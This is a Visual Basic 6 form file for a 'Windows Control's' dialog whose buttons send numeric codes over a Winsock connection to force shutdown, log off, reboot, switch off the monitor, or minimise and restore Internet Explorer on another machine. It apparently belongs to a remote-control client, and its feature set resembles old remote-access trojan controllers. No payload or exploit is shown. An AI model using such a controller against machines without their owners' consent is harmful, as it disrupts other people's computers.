VERSION 5.00
Begin VB.Form FrmControl 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Windows Control's"
   ClientHeight    =   3600
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   4965
   BeginProperty Font 
      Name            =   "Tahoma"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "FrmControl.frx":0000
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3600
   ScaleWidth      =   4965
   StartUpPosition =   2  'CenterScreen
   Begin VB.Frame Frame1 
      Caption         =   "Monitor"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1095
      Left            =   120
      TabIndex        =   10
      Top             =   1680
      Width           =   4695
      Begin VB.CommandButton CmdMonRestore 
         Caption         =   "Rest&ore"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   1680
         TabIndex        =   7
         Top             =   480
         Width           =   1335
      End
      Begin VB.CommandButton CmdMonShutdown 
         Caption         =   "Shut&down"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   240
         TabIndex        =   6
         Top             =   480
         Width           =   1335
      End
   End
   Begin VB.CommandButton CmdClose 
      Caption         =   "&Close"
      Default         =   -1  'True
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   3480
      TabIndex        =   8
      Top             =   3120
      Width           =   1335
   End
   Begin VB.Frame Frame8 
      Caption         =   "Windows"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1455
      Left            =   120
      TabIndex        =   9
      Top             =   120
      Width           =   4695
      Begin VB.CommandButton CmdRestoreIE 
         Caption         =   "R&estore All IE"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   3120
         TabIndex        =   5
         Top             =   840
         Width           =   1335
      End
      Begin VB.CommandButton CmdMinimiseIE 
         Caption         =   "&Minimise All IE"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   1680
         TabIndex        =   4
         Top             =   840
         Width           =   1335
      End
      Begin VB.CommandButton CmdReboot 
         Caption         =   "&Reboot"
         Height          =   375
         Left            =   240
         TabIndex        =   3
         Top             =   840
         Width           =   1335
      End
      Begin VB.CommandButton CmdLogOff 
         Caption         =   "&Log off"
         Height          =   375
         Left            =   240
         TabIndex        =   0
         Top             =   360
         Width           =   1335
      End
      Begin VB.CommandButton CmdForceShutdown 
         Caption         =   "&Force shutdown"
         Height          =   375
         Left            =   1680
         TabIndex        =   1
         Top             =   360
         Width           =   1335
      End
      Begin VB.CommandButton CmdShutdown 
         Caption         =   "&Shutdown"
         Height          =   375
         Left            =   3120
         TabIndex        =   2
         Top             =   360
         Width           =   1335
      End
   End
   Begin VB.Image Image1 
      Height          =   480
      Left            =   240
      Picture         =   "FrmControl.frx":08CA
      Top             =   3000
      Width           =   480
   End
End
Attribute VB_Name = "FrmControl"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub CmdClose_Click()
    Unload Me
End Sub

Private Sub CmdForceShutdown_Click()
    On Error Resume Next
    FrmMain.WinSockCtl.SendData "062"
End Sub

Private Sub CmdLogOff_Click()
    On Error Resume Next
    FrmMain.WinSockCtl.SendData "061"
End Sub

Private Sub CmdMonRestore_Click()
    On Error Resume Next
    FrmMain.WinSockCtl.SendData "098"
End Sub

Private Sub CmdMonShutdown_Click()
    On Error Resume Next
    FrmMain.WinSockCtl.SendData "097"
End Sub

Private Sub CmdMinimiseIE_Click()
    On Error Resume Next
    FrmMain.WinSockCtl.SendData "075"
End Sub

Private Sub CmdReboot_Click()
    On Error Resume Next
    FrmMain.WinSockCtl.SendData "064"
End Sub

Private Sub CmdRestoreIE_Click()
    On Error Resume Next
    FrmMain.WinSockCtl.SendData "076"
End Sub

Private Sub CmdShutdown_Click()
    On Error Resume Next
    FrmMain.WinSockCtl.SendData "063"
End Sub
